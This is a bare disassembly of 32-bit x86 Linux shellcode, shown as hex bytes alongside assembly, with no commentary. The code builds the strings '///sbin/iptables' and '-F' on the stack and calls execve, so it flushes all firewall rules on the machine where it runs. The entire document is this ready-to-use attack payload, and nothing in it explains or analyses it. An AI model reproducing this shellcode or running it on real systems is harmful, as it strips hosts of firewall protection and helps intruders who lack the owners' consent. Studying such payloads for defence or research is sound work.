00000000  31C0              xor eax,eax
00000002  50                push eax
00000003  66682D46          push word 0x462d
00000007  89E6              mov esi,esp
00000009  50                push eax
0000000A  68626C6573        push dword 0x73656c62
0000000F  6869707461        push dword 0x61747069
00000014  6862696E2F        push dword 0x2f6e6962
00000019  682F2F2F73        push dword 0x732f2f2f
0000001E  89E3              mov ebx,esp
00000020  50                push eax
00000021  56                push esi
00000022  53                push ebx
00000023  89E1              mov ecx,esp
00000025  89C2              mov edx,eax
00000027  B00B              mov al,0xb
00000029  CD80              int 0x80
